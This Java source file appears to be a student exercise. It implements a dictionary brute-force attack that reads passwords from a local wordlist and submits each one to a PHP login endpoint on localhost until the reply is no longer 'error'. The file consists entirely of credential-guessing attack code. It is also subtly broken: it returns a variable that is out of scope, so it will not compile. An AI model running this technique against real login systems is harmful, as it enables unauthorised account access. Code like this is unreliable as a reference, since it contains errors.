import java.io.FileInputStream;
import java.io.InputStream;
import java.util.Scanner;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.MalformedURLException;
import java.net.URL;
import java.net.URLConnection;

public class Dictionnaire extends Attack {
    public User User1 = new User("baba", "abaaa");

    String s;
    int i = 0;

    public Dictionnaire() {
    }

    public String mdpCrack() throws Exception {
        InputStream doc = new FileInputStream("/Users/mac/Desktop/forceBrute/dico.txt");

        try (Scanner obj = new Scanner(doc)) {
            while (obj.hasNextLine()) {
                i++;
                System.out.println("iteration:" + i);
                String mdp = obj.next();
                URL url = new URL("http://localhost:8080/User.php?pwd=" + mdp);
                URLConnection connection = url.openConnection();

                // `HttpURLConnection` connection = (HttpURLConnection) url.openConnection();
                // connection.setRequestMethod("GET");

                try (BufferedReader in = new BufferedReader(
                        new InputStreamReader(connection.getInputStream()))) {
                    String line;
                    while ((line = in.readLine()) != null) {

                        System.out.println(line);
                        if (line.equals("error")) {
                        } else {
                            System.exit(0);

                        }
                    }

                }

            }
            obj.close();

        }
        return mdp;

    }

}
